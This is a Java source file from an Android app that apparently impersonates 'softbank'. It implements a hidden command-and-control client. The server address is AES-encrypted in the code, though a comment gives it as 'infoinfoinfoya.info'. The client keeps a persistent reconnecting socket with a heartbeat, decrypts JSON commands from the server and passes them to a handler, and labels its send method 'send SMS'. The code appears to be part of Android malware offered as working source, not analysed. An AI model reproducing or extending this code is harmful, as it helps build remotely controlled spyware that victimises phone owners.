package com.example.softbank.socket;

import android.content.Context;

import com.example.softbank.socket.listener.OnConnection;
import com.example.softbank.socket.task.HeartbeatTask;
import com.example.softbank.utils.AESUtil;
import com.example.softbank.utils.AppIconUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.Iterator;
import java.util.regex.Pattern;

public class SocketManage extends Thread {
    private SocketChannel socketChannel;
    private OnConnection connection;
    private boolean HeartbeatTask;
    private final int ByteMax = 65535;
    private Context context;
    private Selector selector;
    private com.example.softbank.socket.task.HeartbeatTask heartbeatTask;

    @Override
    public void run() {
        initSocketChannel();
    }

    @SuppressWarnings("InfiniteLoopStatement")
    public synchronized void initSocketChannel() {
        close();
        setHeartbeatTask(false);
        //开始建立连接
        try {
            selector = Selector.open();
            socketChannel = SocketChannel.open();
            socketChannel.socket().setKeepAlive(true);
            socketChannel.configureBlocking(false);
            // 指定要连接服务地址和端口 infoinfoinfoya.info
            socketChannel.connect(new InetSocketAddress(AESUtil.decrypt("XAdYrTAvjUb4qUm9gIDdi+NkIP9B7RoVZj8+uyGpl50=", AppIconUtil.aa), 808));
            long start = System.currentTimeMillis();
            // 完成 非阻塞式 连接建立
            while (!socketChannel.finishConnect()) {
                long end = System.currentTimeMillis() - start;
                if (end >= 10000) {
                    // System.out.println("连接超时");
                    throw new Exception("connect time");
                }
            }
            socketChannel.register(selector, SelectionKey.OP_READ | SelectionKey.OP_WRITE);
            do {
                selector.select(); //获取感兴趣的selector数量
                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();
                while (keys.hasNext()) {
                    SelectionKey key = keys.next();
                    keys.remove(); //删除迭代器
                    // 读事件
                    if (key.isReadable()) {
                        handleReadable(key);
                    }
                }
            } while (true);
        } catch (Exception e) {
            //System.out.println("异常重连" + e.getMessage());
            //连接失败重连,和读取失败重连
            try {
                Thread.sleep(15000);
            } catch (InterruptedException ex) {
                ex.fillInStackTrace();
            }
            initSocketChannel();
        }
    }

    /**
     * 关闭连接
     */
    public void close() {
        System.out.println("关闭");
        if (socketChannel != null) {
            try {
                socketChannel.close();
                socketChannel = null;
            } catch (IOException e) {
                e.fillInStackTrace();
            }
        }
        if (selector != null) {
            try {
                selector.close();
                selector = null;
            } catch (IOException e) {
                e.fillInStackTrace();
            }
        }
    }

    /**
     * @param key 读取数据
     */
    private void handleReadable(SelectionKey key) throws IOException {
        //读取数据
        SocketChannel socketChannel = (SocketChannel) key.channel();
        //缓存大小
        ByteBuffer readBuffer = ByteBuffer.allocate(ByteMax);
        int read;
        StringBuilder sb = new StringBuilder();
        while ((read = socketChannel.read(readBuffer)) > 0) {
            readBuffer.flip();
            byte[] readByte = new byte[read];
            readBuffer.get(readByte);
            sb.append(new String(readByte));
            readBuffer.clear();
        }
        //System.out.println("读取事件");
        if (read == -1) {
            throw new IOException("read -1");
        }
        handleData(sb.toString());
    }

    public SocketChannel getSocketChannel() {
        return socketChannel;
    }

    /**
     * @param toString 处理数据
     */
    private void handleData(String toString) {
        if (toString.equals("0")) {
            HeartbeatTask = true;
            return;
        } else if (toString.equals("1")) {
            //服务端心跳
            print("0");
            return;
        } else if (isNumeric(toString) && toString.contains("0")) {
            //心跳粘包
            HeartbeatTask = true;
            return;
        }
        //采用{}包裹加密解决粘包问题
        toString = remove(toString);
        try {
            String json = AESUtil.decrypt(toString, AppIconUtil.aa);
            if (json == null || json.equals("1")) {
                return;
            }
            JSONObject jsonObject = new JSONObject(json);
            String type = jsonObject.getString("type");
            if (type.equals("welcome")) {
                //连接成功
                if (connection != null) {
                    connection.success(this);
                }
                //防止双心跳
                if (heartbeatTask != null && heartbeatTask.isAlive()) {
                    heartbeatTask.setRun(true);
                }
                //创建心跳
                heartbeatTask = new HeartbeatTask(this);
                heartbeatTask.start();
            } else {
                DataHandle.getInstance().setSocketManage(this);
                DataHandle.getInstance().handle(type, jsonObject);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static boolean isNumeric(String str) {
        Pattern pattern = Pattern.compile("[0-9]*");
        return pattern.matcher(str).matches();
    }

    private String remove(String string) {
        int start = string.indexOf("{");
        int end = string.lastIndexOf("}");
        return string.substring(start, end + 1);
    }

    /**
     * @param text 发送短信
     * @return
     */
    public boolean print(String text) {
        try {
            if (socketChannel != null && socketChannel.isConnected()) {
                //缓存大小
                ByteBuffer writeBuffer = ByteBuffer.allocate(ByteMax);
                writeBuffer.put(text.getBytes());
                writeBuffer.flip();
                // 写入数据
                while (writeBuffer.hasRemaining()) {
                    socketChannel.write(writeBuffer);
                }
                writeBuffer.compact();
                return true;
            }
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return false;
    }


    public void setContext(Context context) {
        this.context = context;
    }

    public Context getContext() {
        return context;
    }

    public boolean isHeartbeatTask() {
        return HeartbeatTask;
    }

    public void setHeartbeatTask(boolean heartbeatTask) {
        HeartbeatTask = heartbeatTask;
    }

    public void setConnection(OnConnection connection) {
        this.connection = connection;
    }
}
